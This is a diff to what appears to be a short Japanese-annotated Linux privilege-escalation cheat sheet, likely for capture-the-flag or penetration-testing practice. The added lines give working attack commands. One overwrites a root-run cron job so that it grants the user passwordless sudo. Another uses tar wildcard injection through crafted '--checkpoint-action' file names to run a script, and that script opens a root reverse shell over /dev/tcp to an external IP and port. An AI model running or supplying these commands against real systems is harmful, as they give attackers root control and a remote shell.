@@ -6,3 +6,25 @@ sudo -l
 
 #引っかかるGroupがある場合
 find / -group <group> 2>/dev/null
+
+#cronでroot権限の何かが動いている場合
+//確認
+cat /etc/crontab
+
+echo 'echo "<user> ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers' > <動いている何か>
+//実行を待って権限の確認
+sudo -l : (ALL) NOPASSWD: ALL
+sudo su
+
+//Tarの脆弱性（*でファイルを指定）
+１　圧縮されるパスでファイルを作成
+touch -- '--checkpoint=1'
+touch -- '--checkpoint-action=exec=sh shell.sh'
+
+cat <<EOF> --checkpoint=1 
+cat <<EOF> "--checkpoint-action=exec=sh shell.sh" 
+
+２　実行されるシェルスクリプトを作成
+cat <<EOF> shell.sh
+> sudo bash -c 'exec bash -i &>/dev/tcp/192.168.11.137/5555 <&1'
+> EOF
